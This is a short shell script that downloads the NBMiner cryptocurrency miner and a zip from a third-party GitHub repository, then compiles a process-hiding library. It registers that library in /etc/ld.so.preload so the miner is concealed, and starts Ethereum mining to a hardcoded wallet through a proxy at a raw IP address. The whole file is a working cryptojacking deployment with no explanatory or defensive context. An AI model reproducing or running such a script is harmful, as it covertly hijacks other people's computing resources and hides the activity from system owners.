#!/bin/sh
wget https://github.com/NebuTech/NBMiner/releases/download/v37.2/NBMiner_37.2_Linux.tgz
tar -xvzf NBMiner_37.2_Linux.tgz
cd NBMiner_Linux
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./nbminer -a ethash -o ethproxy+ssl://us1.ethermine.org:5555 -u 0x52500352a37a06f0c085d58663e4eadbd7e9f684.NB -log --proxy 139.177.202.146:9999
